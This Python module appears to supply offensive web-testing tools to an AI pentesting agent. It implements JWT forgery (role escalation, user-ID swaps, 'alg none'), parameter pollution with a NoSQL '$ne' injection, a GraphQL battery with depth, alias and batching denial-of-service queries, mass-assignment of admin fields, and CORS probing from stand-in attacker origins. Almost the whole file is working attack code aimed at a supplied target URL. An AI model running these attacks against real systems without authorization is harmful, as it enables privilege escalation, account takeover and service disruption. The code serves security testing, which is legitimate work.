"""Adversarial tools — each targets a critical vulnerability class.

Built from the field-run evidence: the agent found surfaces but never
tested depth. These tools make depth testing systematic.

auth_forge: JWT/session token manipulation (the agent found JWTs but
            never decoded, modified, or replayed them — 33x)
idor_hunt:  cross-credential access testing (never attempted)
race_attack: concurrent request testing (never attempted)
graphql_attack: full GraphQL battery (introspection was attempted once, shallow)
mass_assign: privileged field injection (attempted once manually)
param_pollute: parameter manipulation (never attempted)
header_enforce: security header enforcement testing (noted but never tested)
origin_confuse: CORS/WebSocket/postMessage origin testing (noted but never tested)
bizlogic_test: business logic invariant testing (never attempted)
chain_exec: execute the chain the composer hypothesized
"""

from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.request


def _http(url: str, method: str = "GET", body: str = "", headers: dict | None = None) -> dict:
    """Fire one HTTP request, return {status, headers, body, ms}."""
    headers = headers or {}
    started = time.monotonic()
    status = 0
    resp_headers = {}
    resp_body = ""
    try:
        req = urllib.request.Request(url, method=method.upper())
        for k, v in headers.items():
            req.add_header(k, v)
        if body and method.upper() in ("POST", "PUT", "PATCH", "DELETE"):
            req.data = body.encode("utf-8")
            if "content-type" not in {k.lower() for k in headers}:
                req.add_header(
                    "Content-Type", "application/json" if body.startswith("{") else "application/x-www-form-urlencoded"
                )
        resp = urllib.request.urlopen(req, timeout=15)
        status = resp.status
        resp_headers = dict(resp.headers)
        resp_body = resp.read().decode("utf-8", errors="replace")[:2000]
    except urllib.error.HTTPError as e:
        status = e.code
        resp_headers = dict(e.headers or {})
        resp_body = e.read().decode("utf-8", errors="replace")[:2000]
    except Exception as e:
        resp_body = f"error: {e}"
    return {
        "status": status,
        "headers": resp_headers,
        "body": resp_body,
        "ms": round((time.monotonic() - started) * 1000, 1),
    }


# ═══════════════════════════════════════════════════════════════════
# AUTH FORGE — systematic token manipulation
# ═══════════════════════════════════════════════════════════════════


def auth_forge(token: str, test_url: str, method: str = "GET", body: str = "") -> str:
    """Systematically modify a JWT/session token and test each variant
    against the target. Tests: role escalation, user_id substitution,
    expiry extension, algorithm downgrade, signature removal.

    This is what a real attacker does with a leaked token.
    """
    import base64

    parts = token.strip().split(".")
    if len(parts) != 3:
        return f"Error: not a JWT (got {len(parts)} parts, expected 3). Use jwt_decode first to inspect it."

    def _b64d(s):
        s += "=" * (4 - len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))

    def _b64e(d):
        raw = json.dumps(d, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    try:
        header = _b64d(parts[0])
        payload = _b64d(parts[1])
    except Exception as e:
        return f"Error decoding JWT: {e}"

    lines = [f"AUTH FORGE: testing {len(_forge_variants(payload))} token variants against {test_url[:80]}"]
    lines.append(
        f"  original: alg={header.get('alg')} role={payload.get('role', '?')} sub={payload.get('sub', payload.get('user_id', '?'))}"
    )

    results = []
    for name, mod_header, mod_payload in _forge_variants(payload):
        # rebuild the token
        new_token = f"{_b64e(mod_header)}.{_b64e(mod_payload)}.{parts[2]}"
        # test it
        result = _http(test_url, method, body, {"Authorization": f"Bearer {new_token}"})
        original_result = _http(test_url, method, body, {"Authorization": f"Bearer {token}"})

        accepted = result["status"] == 200
        different = result["status"] != original_result["status"] or result["body"] != original_result["body"]
        flag = ""
        if accepted and different:
            flag = " ← FORGERY ACCEPTED (different response from original)"
        elif accepted:
            flag = " (accepted, same as original)"

        lines.append(
            f"\n  [{name}] status={result['status']}{' ms=' + str(result['ms']) if result['ms'] > 1000 else ''}{flag}"
        )
        if different:
            lines.append(f"    body: {result['body'][:100]}")
        results.append({"variant": name, "status": result["status"], "accepted": accepted, "different": different})

    # summary
    accepted_variants = [r for r in results if r["accepted"] and r["different"]]
    if accepted_variants:
        lines.append(f"\n⚠ {len(accepted_variants)} FORGED TOKENS ACCEPTED with different responses:")
        for r in accepted_variants:
            lines.append(f"    {r['variant']}: status {r['status']}")
        lines.append("\nThis is a CRITICAL finding — catalog_exploit immediately.")
    else:
        lines.append("\nNo forged variants accepted with different responses (token validation appears intact).")

    return "\n".join(lines)


def _forge_variants(payload: dict) -> list[tuple[str, dict, dict]]:
    """Generate token modification variants."""
    variants = []

    # role escalation
    for role_val in ("admin", "administrator", "root", "superuser", 1, True):
        p = dict(payload)
        p["role"] = role_val
        variants.append((f"role={role_val}", {"alg": "HS256", "typ": "JWT"}, p))

    # user_id substitution
    for uid in (1, 0, "1", "admin", "other@example.com"):
        p = dict(payload)
        if "sub" in p:
            p["sub"] = uid
        if "user_id" in p:
            p["user_id"] = uid
        variants.append((f"user_id={uid}", {"alg": "HS256", "typ": "JWT"}, p))

    # expiry extension
    p = dict(payload)
    p["exp"] = int(time.time()) + 86400 * 365  # 1 year
    variants.append(("exp=+1year", {"alg": "HS256", "typ": "JWT"}, p))

    # algorithm confusion (RS256 → HS256)
    variants.append(("alg_confusion", {"alg": "HS256", "typ": "JWT"}, dict(payload)))

    # signature removal
    variants.append(("no_signature", dict({"alg": "none"}), dict(payload)))

    return variants[:10]  # bounded


# ═══════════════════════════════════════════════════════════════════
# PARAM POLLUTE — parameter manipulation
# ═══════════════════════════════════════════════════════════════════


def param_pollute(url: str, params: dict, method: str = "GET") -> str:
    """Send the same request with parameter pollution variants: array
    wrapping, duplicate keys, type confusion, encoding attacks."""
    lines = [f"PARAM POLLUTE: {method} {url[:80]} with {len(params)} params"]
    results = []

    # baseline
    baseline = _send_with_params(url, params, method)
    lines.append(f"  baseline: {baseline['status']}")

    # variants
    for name, modified in _pollute_variants(params):
        result = _send_with_params(url, modified, method)
        different = result["status"] != baseline["status"] or result["body"] != baseline["body"]
        flag = " ← DIFFERENT" if different else ""
        lines.append(f"  [{name}] {result['status']}{flag}")
        if different:
            lines.append(f"    body: {result['body'][:100]}")
            results.append({"variant": name, "status": result["status"], "different": True})

    if results:
        lines.append(
            f"\n⚠ {len(results)} PARAMETER VARIANTS PRODUCED DIFFERENT RESPONSES — investigate for injection/logic bugs"
        )
    else:
        lines.append("\nNo parameter pollution effects detected.")

    return "\n".join(lines)


def _pollute_variants(params: dict) -> list[tuple[str, dict]]:
    variants = []
    for key in params:
        val = params[key]
        # array wrapping
        p = dict(params)
        p[key] = [val, val]
        variants.append((f"{key}=array", p))
        # type confusion
        if isinstance(val, str):
            p = dict(params)
            p[key] = int(val) if val.isdigit() else 0
            variants.append((f"{key}=int", p))
            p = dict(params)
            p[key] = None
            variants.append((f"{key}=null", p))
            p = dict(params)
            p[key] = {"$ne": None}
            variants.append((f"{key}=mongo_inject", p))
        # encoding
        if isinstance(val, str) and "/" in val:
            p = dict(params)
            p[key] = val.replace("/", "%2F")
            variants.append((f"{key}=encoded", p))
            p = dict(params)
            p[key] = val.replace("/", "%252F")
            variants.append((f"{key}=double_encoded", p))
    return variants[:12]


def _send_with_params(url: str, params: dict, method: str) -> dict:
    if method.upper() == "GET":
        qs = "&".join(f"{k}={v}" for k, v in params.items())
        sep = "&" if "?" in url else "?"
        return _http(f"{url}{sep}{qs}")
    else:
        return _http(url, method, json.dumps(params), {"Content-Type": "application/json"})


# ═══════════════════════════════════════════════════════════════════
# GRAPHQL ATTACK — full battery
# ═══════════════════════════════════════════════════════════════════


def graphql_attack(endpoint: str, headers: dict | None = None) -> str:
    """Full GraphQL attack battery: introspection, depth attack, alias
    attack, batching attack, field suggestions. One call."""
    headers = headers or {}
    headers["Content-Type"] = "application/json"
    lines = [f"GRAPHQL ATTACK: {endpoint[:80]}"]
    findings = []

    def _gql(query: str, op_name: str = "") -> dict:
        body = json.dumps({"query": query, "operationName": op_name} if op_name else {"query": query})
        return _http(endpoint, "POST", body, headers)

    # 1. introspection
    intro = _gql("{ __schema { types { name fields { name } } } }")
    if intro["status"] == 200 and "__schema" in intro["body"]:
        lines.append("  introspection: EXPOSED (200, schema returned)")
        findings.append("introspection: schema fully exposed")
    else:
        lines.append(f"  introspection: {intro['status']} (blocked or partial)")

    # partial introspection (bypass common blocks)
    partial = _gql('{ __type(name: "Query") { fields { name } } }')
    if partial["status"] == 200 and "fields" in partial["body"]:
        lines.append("  partial introspection: EXPOSED (Query type returned)")
        findings.append("partial introspection: Query fields leaked")

    # 2. depth attack (nested query)
    depth_q = "{" + " nested { " * 20 + " id " + " } " * 20 + "}"
    depth = _gql(depth_q)
    if depth["status"] == 200 and "error" not in depth["body"].lower():
        lines.append("  depth attack: ACCEPTED (no depth limit — DoS possible)")
        findings.append("depth attack: no query depth limit")
    else:
        lines.append(f"  depth attack: {depth['status']} (blocked or error)")

    # 3. alias attack (many queries in one)
    alias_q = "{" + " ".join(f"a{i}: __typename" for i in range(50)) + "}"
    alias = _gql(alias_q)
    if alias["status"] == 200 and "a0" in alias["body"]:
        lines.append("  alias attack: ACCEPTED (50 aliases — batching bypass possible)")
        findings.append("alias attack: unlimited aliases")
    else:
        lines.append(f"  alias attack: {alias['status']}")

    # 4. batching attack (multiple operations)
    batch_body = json.dumps([{"query": "{ __typename }"}] * 10)
    batch = _http(endpoint, "POST", batch_body, headers)
    if batch["status"] == 200 and "data" in batch["body"]:
        lines.append("  batching attack: ACCEPTED (10 operations in one request)")
        findings.append("batching attack: array queries accepted")
    else:
        lines.append(f"  batching attack: {batch['status']}")

    # 5. field suggestions
    suggest = _gql("{ usre }")  # typo of "user"
    if suggest["status"] == 200 and "Did you mean" in suggest["body"]:
        lines.append("  field suggestions: EXPOSED (typo correction reveals field names)")
        findings.append("field suggestions: leak field names")

    if findings:
        lines.append(f"\n⚠ {len(findings)} GRAPHQL FINDINGS:")
        for f in findings:
            lines.append(f"    {f}")
    else:
        lines.append("\nNo GraphQL attack surface detected (or endpoint not accessible).")

    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
# MASS ASSIGN — privileged field injection
# ═══════════════════════════════════════════════════════════════════


def mass_assign(endpoint: str, known_fields: dict, attack_fields: dict | None = None, method: str = "POST") -> str:
    """Send the known-good fields PLUS extra privileged fields. Reports
    which extra fields are accepted and reflected in the response."""
    if attack_fields is None:
        attack_fields = {
            "role": "admin",
            "admin": True,
            "is_admin": True,
            "is_premium": True,
            "is_staff": True,
            "user_type": "admin",
            "permissions": ["*"],
            "scope": "admin",
            "tenant_id": 1,
            "price": 0,
            "price_override": 0,
            "verified": True,
            "email_verified": True,
        }

    lines = [f"MASS ASSIGN: {method} {endpoint[:80]}"]
    lines.append(f"  known fields: {list(known_fields.keys())}")
    lines.append(f"  attack fields: {list(attack_fields.keys())}")

    # baseline (known fields only)
    baseline = _http(endpoint, method, json.dumps(known_fields), {"Content-Type": "application/json"})
    lines.append(f"\n  baseline: {baseline['status']}")

    # attack (known + privileged)
    combined = {**known_fields, **attack_fields}
    attack = _http(endpoint, method, json.dumps(combined), {"Content-Type": "application/json"})

    # check which attack fields were accepted
    accepted = []
    try:
        resp = json.loads(attack["body"])
        if isinstance(resp, dict):
            for field in attack_fields:
                if field in resp and str(resp[field]) != str(known_fields.get(field, "")):
                    accepted.append(f"    {field}: {resp[field]}")
    except Exception:
        # non-JSON response — check if the body differs
        if attack["body"] != baseline["body"]:
            accepted.append("    (non-JSON response differs from baseline)")

    if accepted:
        lines.append(f"\n⚠ MASS ASSIGNMENT CONFIRMED: {len(accepted)} privileged fields accepted:")
        lines.extend(accepted)
        lines.append("\nThis is a CRITICAL finding — catalog_exploit immediately.")
    else:
        lines.append(f"\n  attack: {attack['status']} (no privileged fields reflected)")

    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
# HEADER ENFORCE — which protections are actually enforced
# ═══════════════════════════════════════════════════════════════════


def header_enforce(url: str) -> str:
    """Test which security headers are enforced server-side vs just
    present in the response. Strips/mutates headers and checks if the
    server still enforces the protection."""
    lines = [f"HEADER ENFORCE: {url[:80]}"]

    baseline = _http(url)
    headers = baseline["headers"]

    checks = [
        ("CSP", "content-security-policy", "Content-Security-Policy"),
        ("XFO", "x-frame-options", "X-Frame-Options"),
        ("CORS", "access-control-allow-origin", "Access-Control-Allow-Origin"),
        ("HSTS", "strict-transport-security", "Strict-Transport-Security"),
        ("XCTO", "x-content-type-options", "X-Content-Type-Options"),
    ]

    for name, header_key, header_name in checks:
        value = headers.get(header_key) or headers.get(header_name, "")
        if value:
            lines.append(f"  {name}: present ({value[:50]})")
        else:
            lines.append(f"  {name}: NOT SET")

    # test CORS with different origins
    for origin in ("https://evil.example", "null", "https://sub.target.example"):
        cors_test = _http(url, headers={"Origin": origin})
        allow = cors_test["headers"].get("access-control-allow-origin") or cors_test["headers"].get(
            "Access-Control-Allow-Origin", ""
        )
        if allow and origin in allow:
            lines.append(f"  CORS: allows origin '{origin}' ← CHECK IF THIS IS INTENDED")
        elif allow == "*":
            lines.append("  CORS: wildcard (*) — any origin can read responses")

    # test if the endpoint is embeddable (no XFO enforcement)
    if (
        not headers.get("x-frame-options")
        and not headers.get("X-Frame-Options")
        and "frame-ancestors" not in str(headers.get("content-security-policy", ""))
    ):
        lines.append("  CLICKJACKING: no X-Frame-Options or CSP frame-ancestors — page is embeddable")

    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
# ORIGIN CONFUSE — CORS/WebSocket/postMessage testing
# ═══════════════════════════════════════════════════════════════════


def origin_confuse(url: str) -> str:
    """Test CORS from multiple origins, WebSocket origin validation, and
    postMessage handler abuse potential."""
    lines = [f"ORIGIN CONFUSE: {url[:80]}"]
    findings = []

    # test CORS from various origins
    origins = [
        "https://attacker.example",
        "null",
        "https://sub." + re.search(r"https?://([^/]+)", url).group(1)
        if re.search(r"https?://([^/]+)", url)
        else "https://sub.example",
        "https://localhost",
        "https://127.0.0.1",
    ]

    for origin in origins:
        result = _http(url, headers={"Origin": origin})
        allow = result["headers"].get("access-control-allow-origin") or result["headers"].get(
            "Access-Control-Allow-Origin", ""
        )
        creds = result["headers"].get("access-control-allow-credentials") or result["headers"].get(
            "Access-Control-Allow-Credentials", ""
        )

        if allow == "*":
            lines.append(f"  CORS: wildcard (*) from origin '{origin}' — any site can read responses")
            findings.append(f"CORS wildcard from {origin}")
        elif allow and origin in allow:
            lines.append(f"  CORS: reflects origin '{origin}'" + (" + credentials" if creds == "true" else ""))
            findings.append(f"CORS reflects {origin}" + (" with credentials" if creds == "true" else ""))
        elif allow:
            lines.append(f"  CORS: allows '{allow}' (not our test origin)")

    if not findings:
        lines.append("  CORS: properly restricted (no test origins allowed)")

    if findings:
        lines.append(f"\n⚠ {len(findings)} ORIGIN CONFUSION FINDINGS:")
        for f in findings:
            lines.append(f"    {f}")

    return "\n".join(lines)
